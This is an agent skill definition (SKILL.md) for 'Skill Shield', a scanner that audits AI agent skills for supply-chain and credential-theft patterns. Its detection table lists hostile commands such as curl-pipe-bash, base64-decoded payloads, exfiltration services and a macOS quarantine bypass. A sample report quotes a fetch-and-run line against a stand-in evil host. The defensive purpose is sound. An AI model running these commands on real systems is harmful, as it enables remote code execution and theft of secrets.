---
name: skill-shield
version: 2.0.0
description: >
  Universal skill security scanner and auditor. Automatically detects malicious patterns,
  supply-chain attacks, credential theft, and install traps in AI agent skills.
  Works across all agent platforms (Gemini, Claude, Copilot, Cursor, Windsurf, etc.).
  Supports pre-install scanning and post-install auditing.
author: zhangchengli
metadata:
  {
    "openclaw": {
      "requires": { "bins": ["python3"] },
      "category": "security"
    }
  }
---

# 🛡️ Skill Shield — Universal Skill Security Scanner

## When To Use This Skill

You MUST use this skill in the following scenarios. This is not optional.

### Trigger 1 — Pre-Install Scan (Before installing any skill)
Before you install, clone, download, or enable ANY new skill from ANY source (GitHub, ClawHub,
a URL the user gives you, or a local directory), you MUST scan it first:

```bash
python3 <this-skill-dir>/scripts/shield.py scan <path-or-url>
```

**Decision rules based on scan result:**
- Exit code `0` → Safe. Proceed with installation.
- Exit code `1` (HIGH risk) → STOP. Show the full report to the user. Ask for explicit confirmation before continuing.
- Exit code `2` (CRITICAL risk) → REFUSE to install. Show the report and explain why it is dangerous.

### Trigger 2 — Post-Install Audit (When the user asks to check installed skills)
When the user asks you to "audit", "check", "review", or "scan" their installed skills,
run a full system audit:

```bash
python3 <this-skill-dir>/scripts/shield.py audit
```

This will automatically discover and scan ALL skill directories across:

| Scope | Paths Checked |
|-------|--------------|
| **Global (HOME)** | `~/.gemini/skills`, `~/.claude/skills`, `~/.agents/skills`, `~/.agent/skills`, `~/.copilot/skills`, `~/.cursor/skills`, `~/.windsurf/skills`, `~/.codeium/skills`, `~/.continue/skills`, `~/.aider/skills` |
| **Workspace** | `./skills`, `./.agents/skills`, `./.agent/skills`, `./_agents/skills`, `./_agent/skills`, `./.gemini/skills`, `./.claude/skills`, `./.github/skills`, `./.cursor/skills` |

If the user's workspace root is different from the current directory, pass it explicitly:
```bash
python3 <this-skill-dir>/scripts/shield.py audit --workspace /path/to/project
```

### Trigger 3 — URL Check
When you encounter a URL in a skill's installation instructions and want to quickly verify trust:
```bash
python3 <this-skill-dir>/scripts/shield.py check-url <url>
```

## What It Detects

| Category | Patterns | Risk Level |
|----------|----------|------------|
| Remote code execution | `curl \| bash`, `wget \| sh`, `curl \| python` | 🔴 CRITICAL |
| Obfuscated payloads | `base64 -d \| sh`, `eval(base64...)`, `python -c exec(decode...)` | 🔴 CRITICAL |
| Exfiltration endpoints | `webhook.site`, `ngrok`, `pastebin`, `requestbin`, `discordapp webhooks` | 🔴 CRITICAL |
| macOS Gatekeeper bypass | `xattr -d com.apple.quarantine` | 🔴 CRITICAL |
| Sensitive file access | `.env`, `.ssh`, `/etc/passwd`, `credentials`, `token`, `api_key`, `private_key` | 🟡 HIGH |
| Unknown package installs | `npm install <pkg>`, `pip install <pkg>` (not in allowlist) | 🟡 HIGH |
| Download-and-execute | `chmod +x && ./`, `curl -o ... && ./`, `wget && chmod` | 🟡 HIGH |
| Privilege escalation | `sudo` commands | 🟠 MEDIUM |
| Data exfiltration via POST | `curl -X POST`, `requests.post`, `fetch(POST)` | 🟠 MEDIUM |
| External URLs | Any `http(s)://` not in the allowlist | 🟠 MEDIUM |

## How To Read the Output

The scanner outputs a structured report with:

```
[🛡️ Skill Shield] Scanning: <target>
============================================================
Risk: 🔴 CRITICAL — Reject / Uninstall immediately

3 finding(s):

  🔴 CRITICAL (1)
    ├─ SKILL.md:23 | Executes remote script without verification
    │  └─ curl -s https://evil.com/setup.sh | bash

  🟡 HIGH (2)
    ├─ install.sh:5 | Installs unknown npm package
    │  └─ npm install evil-pkg
    ├─ SKILL.md:40 | Accesses sensitive credential files
    │  └─ .env
============================================================
```

**Exit codes** are designed for programmatic use:
- `0` = SAFE / LOW / MEDIUM
- `1` = HIGH (needs human approval)
- `2` = CRITICAL (refuse)

## File Structure

```
skill-shield/
├── SKILL.md               ← This file (agent instructions)
├── README.md              ← Human-readable documentation
├── _meta.json             ← Skill metadata
├── scripts/
│   └── shield.py          ← Core scanner (zero dependencies, Python 3 stdlib only)
└── patterns/
    ├── critical.json      ← CRITICAL-level patterns
    ├── high.json          ← HIGH-level patterns
    ├── medium.json        ← MEDIUM-level patterns
    └── allowlist.json     ← Trusted URLs and packages
```

## Key Design Decisions

1. **Zero dependencies**: The scanner uses only Python 3 standard library. No `pip install` needed.
2. **Platform-agnostic**: Works on macOS, Linux, and Windows.
3. **Non-destructive**: Read-only static analysis. Never modifies files.
4. **Allowlist-based**: Known-safe URLs and packages are excluded from alerts to reduce noise.
5. **Exit-code driven**: Enables integration with CI/CD, git hooks, and programmatic workflows.

## Extending the Pattern Database

To add new detection patterns, edit the JSON files in `patterns/`:

```json
{
  "name": "pattern_name",
  "pattern": "regex_pattern_here",
  "description": "Human-readable explanation",
  "check_allowlist": "urls"
}
```

The `check_allowlist` field is optional. If present, matches against the allowlist key before reporting.
